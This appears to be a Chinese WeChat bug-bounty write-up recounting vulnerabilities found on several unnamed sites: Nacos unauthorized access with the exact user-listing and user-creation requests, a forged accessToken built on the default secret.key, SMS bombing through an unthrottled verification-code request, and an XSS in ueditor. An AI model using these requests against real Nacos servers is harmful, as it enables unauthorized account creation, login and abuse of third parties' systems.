---
title: [SRC]漏洞显现
url: https://mp.weixin.qq.com/s/WbVDivZkzkQUdncwApaozg
source: Doonsec's feed
date: 2026-05-23
fetch_date: 2026-05-24T05:58:58.057382
---

# [SRC]漏洞显现

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbClOGHzicolRw4g3FiaUvhFhtW65HgfYSzUQZ36rBKhIHSFgHUrGZj1sYqMEMwj2sPdtIdD6dP2sxhuEAXPTNE1tGEpecSt6UyCI/0?wx_fmt=jpeg)

# [SRC]漏洞显现

原创

略懂安全的三秋
略懂安全的三秋

略懂安全的三秋

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

无问AI远超通用大模型，在网络安全问题理解、代码生成、安全研究分析及其他复杂场景上是你的最佳选择。

链接：https://www.wwlib.cn/index.php/

如果积分不够用可以使用我的积分码，即可领取100积分

兑换链接：https://www.wwlib.cn/index.php/gift

****WUWEN\_gD5m4O8qDIlh4Os6MX****

![屏幕截图 2026-05-08 110152.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbCsARibyyGfZKj4r7vAqyic90bibsnGQiaeHep4kibVicdibpA4LprR4KwdtcsP4S6PicRsFTJn5MibmBO19LfXQQxiccwzcHf8WaiapiaGZTU/640?wx_fmt=jpeg)

Nacos 未授权访问

查看用户列表的请求并在前台访问

http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9

![屏幕截图 2026-05-08 110601.png](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbATDhsOMeic8TVGHb1TTpRJeu8MiciaNbpwXdmWWjr7CJqs5gic8PlYEUgbtXnHI8hLUvngibl56icbWwQGgSM7Hhv9ulzoBy6BTQ73E/640?wx_fmt=jpeg)

尝试创建用户并抓包

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBzsqwzPkTl222ylAXprGauJ2ia61T7eicHGCDIFU6c1WJ9ROMELIVxE7KqpITibibOBLZICXY9Pe6nuibsqUey5ZKibkYDIueDd8Z9U/640?wx_fmt=jpeg&from=appmsg)

返回下列创建成功

 {"code":200,"message":"create user ok!","data":null}

 同样的我们简化请求

```
POST /nacos/v1/auth/users?username=peiqi&password=peiqi
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBKRSAxOyT29gA9ktUmX0UJDnLRF1otGHlUheveW2AmUUtMtHl7NiaXd0WicwKyfzYvqoBzyFWkib0C0lHIpO4p1tlsWLZciaOZhB8/640?wx_fmt=jpeg&from=appmsg)

使用我们创建的账号登录

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBxibicKUop4hAFqYIVN2V6m53N2t8icQvBvWvgNPBO68Ek7xS8qYGIbwAT1XDMEIA783DTMI1NicTGNO7a0grbksiciaJebuHMiaIDkU/640?wx_fmt=jpeg)

Nacos secret.key 默认密钥 未授权访问

验证POC

```
/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
```

直接拦截登录包

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbC44Diabbe1iaXeTFzftURBxpb5wXgPIsZWZsFKic7iadjmG1bBE2ic2Ux4zEyGCFqcibyicw8No3niauhPS2uJthDMGDNLg546XWw7MCo/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbCZSKP2Cx2rXhQwy5ZaGjD9fopGrfBxq0esDvH9oUwpmwhTPJUwl3M1z6Y7k1YFxeQFYnvZVJjZUs8ticlWdR8SjsgQJsOZC6Eg/640?wx_fmt=jpeg)

成功登录

访问下一个站

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbAojGtufxb8G9xic0KvZo7uDDxicxPUmDkpwc5ibh1PPC4cOFExND1HaiaJbM9NZFE6TyhiarcvDFm5bNK7EZn6odIwTom8tibeGCjhk/640?wx_fmt=jpeg&from=appmsg)

![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png)

继续下一个站

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbCnKpv681nA81icf8D8JXk4w6XKhCcrFeTOhfEVhDhAeJj8QF6k31TLpNXkkibxdOGYKicUibufjM3CvicCqF1N4j3A7PG41Pbvlrwg/640?wx_fmt=jpeg&from=appmsg)

因为有注册，所以注册一手

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBicJFw8EhnP4Aaxa63yG8ooH5icbFMP2xkTtMibXeQW5JKH2YibVeOz6bWZPMEN4AFVohtTtAGX04AiaWsCxoiaBK2IsFWpVRMGqEtA/640?wx_fmt=jpeg&from=appmsg)

这是验证码的请求包

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbBJmyCpPiah5JiaQvHxoSRbib9ubh6PVayvOYSQv2rqdiaWflv1CRoUWeyTQVXicP1x1SpibiamcHrFJAdHXuiaU9rC76um7bvqqIhmiago/640?wx_fmt=jpeg&from=appmsg)

但它没有做风流限制所以就有了短信轰炸

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbBuuAic6xgqYPxjRQNA10CRurXnDvicrjMUmPfht6CCZPdXOQXib2Tr1zQRNzUNlF6o5OG4MzHg0J7YIt0eGDByHfa5kwAce0p3IU/640?wx_fmt=jpeg)

之后登录了也没发现什么，所以就去扫了一下目录，发现了ueditor

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbDqicJNHV2WvKia6BeMdN2ljJd5aNr28RhBt6Hu3Z5ZmH5Xia7HtARQQw4o08BUYzLHuvFSic7zOgk3bA7PuowTjrvicialyHzflOBiaQ/640?wx_fmt=jpeg)

这里只能水一个XSS了

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAC31D6KkChxQQgSHQY4w1RJA77ibs1scRuFBt8icicvlXk6AOXH0ia2B6v2fK6KN7Dp5RKPmMEJCZXg47dOmZsEroIAusgkX5044w/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAUcwFGmFQXtV3EYMrjPyOluVq1LaOAzBxibGWulwDWtuvyMOeqTrhHdRSh71T0IrQTHso4ze8jjEW21WibHw2lEiaCbkmiczjdm94/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbCLibpoeKyUIrykBCCd4Ix1Q2SVIyIsc7IGsL6y2kJktXuMpEpkOprEoL5TVjNdLBTeiaVESIo318WKeepXDXS0sfibQPxG3maGhU/0?wx_fmt=png)

略懂安全的三秋

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbCLibpoeKyUIrykBCCd4Ix1Q2SVIyIsc7IGsL6y2kJktXuMpEpkOprEoL5TVjNdLBTeiaVESIo318WKeepXDXS0sfibQPxG3maGhU/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过